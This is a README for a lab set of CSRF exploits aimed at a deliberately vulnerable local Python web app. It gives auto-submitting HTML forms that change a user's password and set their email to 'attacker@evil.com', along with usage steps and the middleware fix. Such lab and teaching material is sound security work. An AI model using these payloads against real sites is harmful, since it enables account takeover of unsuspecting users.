# Python-VulnerableApp CSRF Exploits

## Overview
CSRF exploits for Python-VulnerableApp. The application has CSRF protection disabled globally.

## Target Application
- **App**: Python-VulnerableApp  
- **Port**: 8080
- **Vulnerability**: No CSRF protection
- **Severity**: MEDIUM

## Available Exploits

### 1. generic_csrf.html
General-purpose CSRF attack page.

**Usage**:
```bash
# Open in browser while logged into app
firefox generic_csrf.html
```

## Attack Vectors

```html
<!-- Change password -->
<form action="http://localhost:8080/change_password" method="POST">
  <input name="new_password" value="hacked123">
</form>
<script>document.forms[0].submit()</script>

<!-- Update profile -->
<form action="http://localhost:8080/profile/update" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

## Testing

1. **Start app**:
```bash
cd ../../projects/Python-VulnerableApp
docker-compose up -d
```

2. **Login** to http://localhost:8080

3. **Execute**:
```bash
firefox generic_csrf.html
```

## Defense

**Vulnerable (CSRF disabled)**:
```python
# CSRF middleware commented out!
# app.middlewares.append(csrf_middleware)
```

**Fixed**:
```python
from aiohttp_csrf import csrf_middleware

app = web.Application(middlewares=[csrf_middleware()])
```

## Notes
CSRF protection is completely disabled in this application's middleware configuration.

## Related
- See `../../dsvpwa/csrf/` for more CSRF techniques
- See `../../ecomstore/csrf/` for order-based CSRF

## References
- OWASP CSRF: https://owasp.org/www-community/attacks/csrf
